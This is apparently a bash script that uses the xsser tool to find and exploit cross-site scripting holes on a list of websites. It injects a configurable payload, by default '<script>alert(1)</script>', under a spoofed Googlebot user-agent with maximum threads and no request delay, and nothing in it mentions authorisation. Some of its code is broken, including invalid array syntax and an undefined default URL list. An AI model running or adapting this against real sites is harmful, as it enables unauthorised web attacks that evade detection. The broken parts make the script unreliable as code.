#!/usr/bin/env bash
set -xeuo pipefail

SCRIPT_PATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"

PAYLOAD_FILE_PATH="${SCRIPT_PATH}/payload.txt"
SITES_URLS_FILE_PATH="${SCRIPT_PATH}/sites-urls.txt"
RESULTS_PATH="${SCRIPT_PATH}/results"

DEFAULT_PAYLOAD="<script>alert(1)</script>"

PAYLOAD_FILE_CONTENT=$( [[ -f "${PAYLOAD_FILE_PATH}" ]] && cat "${PAYLOAD_FILE_PATH}" || echo "")
PAYLOAD="${PAYLOAD_FILE_CONTENT:-$DEFAULT_PAYLOAD}"

MODE=""

read_list() {
    ARRAY=( $( echo "${1}" ) )
    echo "${ARRAY[@]}"
}

print_list() {
    echo "${1[@]}"
}

read_site_urls_list(){
    DEFAULT_SITES_URLS_LIST=$(read_list "${DEFAULT_SITES_URLS}")
    [[ -z "${1}" ]] && echo "${DEFAULT_SITES_URLS_LIST}" && exit 0
    [[ -f "${1}" ]] && read_list "$(cat "${1}")" || echo "${DEFAULT_SITES_URLS_LIST}" && exit 0
}

print_info() {
    echo ""
    echo "Payload: "
    echo "$PAYLOAD"
    echo ""
    # echo "Sites urls:"
    # echo "${SITES_URLS[@]}"
    # echo ""
}

find_and_exploit_vulns(){
    SCAN_MODE="${1:-""}"
    URL="${2:-""}"
    ENDPOINT="${3:-""}"

    [ -z "$URL" ] && exit 0

    echo "Finding and exploiting"
    echo "URL: ${URL}"
    [[ -n "${ENDPOINT}" ]] && echo "Endpoint: ${ENDPOINT}"

    [[ -z "${ENDPOINT}" ]] && SCAN_MODE="DEFAULT"

    ATTACK_MODE_INPUT=""

    case $SCAN_MODE in

        "GET")
            ATTACK_MODE_INPUT="-u ${URL} -g ${ENDPOINT}"
            ;;

        "POST")
            ATTACK_MODE_INPUT="-u ${URL} -p ${ENDPOINT}"
            ;;

        "AUTO")
            ATTACK_MODE_INPUT="--auto -u ${URL}${ENDPOINT}"
            ;;

        "ALL")
            ATTACK_MODE_INPUT="--all ${URL}${ENDPOINT}"
            ;;
        *)
            ATTACK_MODE_INPUT="--all ${URL}${ENDPOINT}"
            ;;
    esac

    xsser $ATTACK_MODE_INPUT \
        -s \
        -v \
        --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)" \
        --threads "$(nproc --all)" \
        --timeout 30 \
        --retries 1 \
        --delay 0 \
        --xml="$RESULTS_PATH/${URL}.xml" \
        --Fp "${PAYLOAD}"
}

usage() {
    echo "Usages: " 1>&2; exit 1;
}

remote_control() {
    echo "Starting remote control"
    print_info

    while read -r TARGET; do
        PARAMS=$(echo "${TARGET}" | xargs)
        find_and_exploit_vulns $PARAMS
        read -r -p "Press any key to resume ..."
    done < "${SITES_URLS_FILE_PATH}"
}

while getopts "lua" option; do
        case "${option}" in
            l)
                MODE="--all"
                ;;
            u)
                MODE="-u"
                ;;
            a)
                MODE="--auto ${MODE}"
                ;;
            *)
                usage
                ;;
        esac
    done
shift $((OPTIND-1))

remote_control
